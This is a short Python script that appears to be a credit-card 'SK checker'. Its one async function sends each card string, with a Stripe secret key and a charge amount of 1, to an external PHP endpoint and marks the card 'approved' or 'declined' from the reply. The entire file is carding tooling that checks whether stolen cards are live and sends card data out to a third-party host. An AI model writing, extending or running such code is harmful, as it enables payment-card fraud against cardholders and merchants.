import aiohttp
import asyncio
import json
import time

# --- CONFIGURATION ---
SK_API_URL = "https://blinkop.online/skb.php?sk={stripe_key}&amount=1&lista="

async def check_sk_card(card: str) -> dict:
    """Check single SK card"""
    start_time = time.time()
    try:
        url = SK_API_URL + card
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=30) as response:
                text = await response.text()
                
                try:
                    data = json.loads(text)
                    ok_status = data.get("ok", False)
                    message = data.get("message", "No response")
                    decline_code = data.get("decline_code", "")
                    
                    elapsed = round(time.time() - start_time, 2)
                    
                    return {
                        "status": "approved" if ok_status else "declined",
                        "message": message,
                        "decline_code": decline_code,
                        "raw_response": text[:200],
                        "elapsed": elapsed
                    }
                except json.JSONDecodeError:
                    elapsed = round(time.time() - start_time, 2)
                    return {
                        "status": "error",
                        "message": "Invalid API response",
                        "elapsed": elapsed
                    }
                
    except asyncio.TimeoutError:
        elapsed = round(time.time() - start_time, 2)
        return {"status": "error", "message": "Timeout", "elapsed": elapsed}
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return {"status": "error", "message": str(e), "elapsed": elapsed}

